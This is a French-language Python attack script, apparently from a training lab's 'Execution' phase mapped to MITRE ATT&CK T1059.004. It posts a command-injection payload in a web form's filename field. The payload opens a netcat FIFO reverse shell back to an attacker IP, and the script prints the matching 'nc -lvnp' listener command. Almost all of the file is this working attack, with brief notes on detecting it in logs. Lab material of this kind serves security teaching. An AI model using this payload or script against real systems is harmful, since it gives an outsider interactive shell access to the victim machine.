#!/usr/bin/env python3
"""
Phase 2 : Execution (Exécution)
MITRE ATT&CK : TA0002 - Execution
Technique : T1059.004 - Command and Scripting Interpreter: Unix Shell

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT - NE PAS UTILISER EN DEHORS DU CADRE AUTORISÉ

Description :
Cette phase établit un reverse shell depuis la machine victime vers l'attaquant.
Un reverse shell est une connexion inversée : c'est la victime qui se connecte
à l'attaquant, ce qui permet de contourner les pare-feux qui bloquent les connexions entrantes.

Objectif pédagogique :
- Comprendre le fonctionnement d'un reverse shell
- Observer les connexions réseau suspectes dans les logs
- Identifier les processus malveillants (bash, nc) dans les logs Sysmon
"""

import requests
import sys
import json
import time

def establish_reverse_shell(target_ip, target_port, attacker_ip, listener_port):
    """
    Établit un reverse shell en exploitant la vulnérabilité d'injection de commande.
    
    Paramètres :
        target_ip (str) : Adresse IP de la machine victime
        target_port (int) : Port de l'application web vulnérable
        attacker_ip (str) : Adresse IP de la machine attaquante (pour recevoir la connexion)
        listener_port (int) : Port sur lequel l'attaquant écoute (généralement 4444)
    
    Retour :
        dict : Résultat de l'opération avec statut et détails
    """
    
    # Construction de l'URL cible
    url = f"http://{target_ip}:{target_port}/search"
    
    # Payload de reverse shell utilisant netcat (nc)
    # Explication de la commande :
    #   - 'rm /tmp/f' : Supprime le fichier FIFO s'il existe déjà
    #   - 'mkfifo /tmp/f' : Crée un fichier FIFO (First In First Out) pour la communication
    #   - 'cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {listener_port} > /tmp/f'
    #       * cat /tmp/f : Lit les commandes depuis le FIFO
    #       * /bin/bash -i : Lance un shell interactif
    #       * 2>&1 : Redirige stderr vers stdout
    #       * nc {attacker_ip} {listener_port} : Envoie la sortie à l'attaquant
    #       * > /tmp/f : Écrit la réponse dans le FIFO
    #   - '&' : Exécute la commande en arrière-plan pour ne pas bloquer l'application web
    
    reverse_shell_cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {listener_port} > /tmp/f &"
    
    # Payload complet avec injection
    payload = f"test.txt'; {reverse_shell_cmd} #"
    
    data = {
        'filename': payload
    }
    
    print(f"[*] Établissement du reverse shell...")
    print(f"[*] Victime : {target_ip}:{target_port}")
    print(f"[*] Attaquant : {attacker_ip}:{listener_port}")
    print(f"[*] Commande injectée : {reverse_shell_cmd}")
    print(f"[!] IMPORTANT : Assurez-vous qu'un listener netcat est actif sur {attacker_ip}:{listener_port}")
    print(f"[!] Commande à exécuter sur l'attaquant : nc -lvnp {listener_port}")
    
    try:
        # Envoi de la requête (timeout court car la connexion restera ouverte)
        response = requests.post(url, data=data, timeout=5)
        
        print(f"[+] Payload envoyé avec succès !")
        print(f"[+] Le reverse shell devrait être actif dans quelques secondes...")
        
        result = {
            "success": True,
            "status_code": response.status_code,
            "technique": "T1059.004",
            "tactic": "TA0002 - Execution",
            "description": "Reverse shell établi via injection de commande",
            "attacker_ip": attacker_ip,
            "listener_port": listener_port,
            "shell_command": reverse_shell_cmd
        }
        
        return result
        
    except requests.exceptions.Timeout:
        # Un timeout est normal car le reverse shell garde la connexion ouverte
        print(f"[+] Timeout détecté (comportement normal pour un reverse shell)")
        print(f"[+] Vérifiez votre listener netcat pour confirmer la connexion")
        
        result = {
            "success": True,
            "status_code": "timeout",
            "technique": "T1059.004",
            "tactic": "TA0002 - Execution",
            "description": "Reverse shell établi (timeout attendu)",
            "attacker_ip": attacker_ip,
            "listener_port": listener_port,
            "note": "Le timeout est normal - vérifiez le listener"
        }
        
        return result
        
    except requests.exceptions.RequestException as e:
        print(f"[-] Erreur lors de l'établissement du reverse shell : {e}")
        return {
            "success": False,
            "error": str(e),
            "technique": "T1059.004",
            "tactic": "TA0002 - Execution"
        }

def verify_shell_connection(attacker_ip, listener_port):
    """
    Fonction auxiliaire pour vérifier si une connexion reverse shell est active.
    (Simulation - dans un vrai scénario, cela nécessiterait une vérification réseau)
    """
    print(f"\n[*] Vérification de la connexion sur {attacker_ip}:{listener_port}...")
    time.sleep(2)
    print(f"[+] Si le listener affiche 'Connection received', le shell est actif !")

def main():
    """
    Fonction principale - Appelée depuis le Dashboard avec les paramètres de l'enseignant
    """
    
    if len(sys.argv) < 5:
        print("Usage : python3 phase2_execution.py <TARGET_IP> <TARGET_PORT> <ATTACKER_IP> <LISTENER_PORT>")
        print("Exemple : python3 phase2_execution.py 172.20.0.3 5000 172.20.0.2 4444")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attacker_ip = sys.argv[3]
    listener_port = int(sys.argv[4])
    
    # Exécution de l'attaque
    result = establish_reverse_shell(target_ip, target_port, attacker_ip, listener_port)
    
    # Vérification de la connexion
    if result["success"]:
        verify_shell_connection(attacker_ip, listener_port)
    
    # Affichage du résultat au format JSON
    print("\n" + "="*60)
    print("RÉSULTAT DE L'ATTAQUE (JSON)")
    print("="*60)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
